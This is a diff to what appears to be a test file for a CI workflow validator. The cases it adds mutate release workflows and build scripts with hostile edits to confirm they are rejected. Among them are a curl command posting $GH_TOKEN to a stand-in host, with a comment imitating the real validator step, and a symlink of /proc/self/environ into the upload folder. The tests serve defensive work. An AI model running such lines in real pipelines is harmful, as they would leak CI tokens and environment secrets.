@@ -16,6 +16,8 @@ PREPARE = "        run: python3 scripts/ci/release.py prepare\n"
 RELEASE = W + "release.yml"
 IMAGE = "scripts/ci/build-image.sh"
 BUILD = '"$@" "$CONTEXT"'
+VALIDATOR = next(step for step in re.split(r"(?m)^(?=      - )", (ROOT / REQUEST).read_text()) if PREPARE in step)
+LINK = 'ln -s /proc/self/environ "$RUNNER_TEMP/upload/x"'
 DOCKERFILE = "container/Dockerfile"
 PUBLISH = "  extra:\n    if: needs.verify.outputs.publish == 'true'\n    environment: other\n"
 MUTATIONS: tuple[tuple[str, str | None, str, str], ...] = (
@@ -58,6 +60,20 @@ MUTATIONS: tuple[tuple[str, str | None, str, str], ...] = (
      "one OCI archive export"),
     (IMAGE, "--provenance false --load", "--provenance mode=min --load", "one OCI archive export"),
     (IMAGE, BUILD, "--attest type=sbom " + BUILD, "--attest"),
+    (IMAGE, BUILD, '"$@" --provenance false "$CONTEXT"', "one OCI archive export"),
+    (IMAGE, None, f"(sleep 600; {LINK}) &\n", "background a command or create a link"),
+    (IMAGE, None, f"{LINK}\n", "background a command or create a link"),
+    (REQUEST, "upload image\n", f"upload image; {LINK}\n", "directly follow"),
+    (REQUEST, "upload image\n", "upload image && true\n", "directly follow"),
+    (REQUEST, '          echo "context=$context" >>"$GITHUB_OUTPUT"\n',
+     f'          echo "context=$context" >>"$GITHUB_OUTPUT"\n          {LINK}\n', "background a command or create a link"),
+    (REQUEST, '          echo "context=$context" >>"$GITHUB_OUTPUT"\n',
+     '          echo "context=$context" >>"$GITHUB_OUTPUT"\n          nohup sleep 600\n', "background a command"),
+    (REQUEST, PREPARE, PREPARE + "\n" + VALIDATOR.replace("id: request", "id: copy").replace(
+        PREPARE,
+        '        run: curl -d "$GH_TOKEN" https://example.invalid # run: python3 scripts/ci/release.py prepare\n'),
+     "only the request validator"),
+    (REQUEST, PREPARE, PREPARE + "\n" + VALIDATOR.replace("id: request", "id: again"), "exactly one step"),
     (IMAGE, BUILD, "--build-context rust-amd64=docker-image://example " + BUILD, "--build-context"),
     (W + "ci.yml", None, "# --build-context\n", "substitute a build stage"),
     (REQUEST, "PROFILE: release\n", "PROFILE: release\n          TAG: ${{inputs.tag}}\n", "only the request validator"),
@@ -67,7 +83,8 @@ MUTATIONS: tuple[tuple[str, str | None, str, str], ...] = (
      "only the request validator"),
     (REQUEST, "PROFILE: release\n", "PROFILE: release\n          ALL: ${{ toJSON(github) }}\n",
      "only the request validator"),
-    (REQUEST, "        if: env.STABLE == 'true'\n", "        if: inputs.mode == 'publish'\n", "only the request validator"),
+    (REQUEST, "        if: env.STABLE == 'true'\n", "        if: inputs.mode == 'publish'\n",
+     "only the request validator"),
     (REQUEST, "    needs: [request, image, client]\n", "    needs: [request, image, client]\n    if: always()\n",
      "past a failure"),
     (REQUEST, "    needs: [request, image, client]\n", "    needs: [request, image, client]\n    if: ${{ always() }}\n",
@@ -75,7 +92,8 @@ MUTATIONS: tuple[tuple[str, str | None, str, str], ...] = (
     (REQUEST, "    needs: [request, image, client]\n", "    needs: [request, image, client]\n    if: '!cancelled()'\n",
      "past a failure"),
     (REQUEST, "        if: env.STABLE == 'true'\n", "        if: failure()\n", "past a failure"),
-    (REQUEST, "    timeout-minutes: 90\n", "    timeout-minutes: 90\n    continue-on-error: true\n", "continue-on-error"),
+    (REQUEST, "    timeout-minutes: 90\n", "    timeout-minutes: 90\n    continue-on-error: true\n",
+     "continue-on-error"),
     (REQUEST, "        run: python3 scripts/ci/assets.py upload image\n", "        run: true\n", "directly follow"),
     (REQUEST, "          path: ${{ runner.temp }}/upload/\n", "          path: ${{ runner.temp }}/release-request/\n",
      "directly follow"),
